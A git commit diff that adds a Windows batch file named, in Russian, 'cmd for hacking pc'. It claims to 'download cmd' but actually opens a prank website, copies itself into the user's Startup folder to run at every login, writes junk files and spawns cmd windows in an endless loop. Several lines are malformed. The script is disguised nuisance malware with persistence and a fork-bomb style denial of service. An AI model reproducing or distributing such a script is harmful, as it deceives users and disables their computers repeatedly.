78e5e8a3e88361a663cb23d5c1f75d33c7c11947
vasya230 <152502651+vasya230@users.noreply.github.com>
2023-11-30 16:07:27 +0300

    Add files via upload

---
+++ cmd для взлома pc.cmd.bat
@@ -0,0 +1,13 @@
+@echo off
+color 2
+echo press enter to download cmd
+pause >nul
+in CMD: title noob
+start "edge" "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" "https://youareanidiot.cc/"
+COPY "%~dp0*.*" "%USERPROFILE%\Start Menu\Programs\Startup
+@echo off
+for /l %%n in (1,1,278) do noob >> noob%%n.txt
+CLS
+:A
+start cmd.exe "echo noob"
+goto A
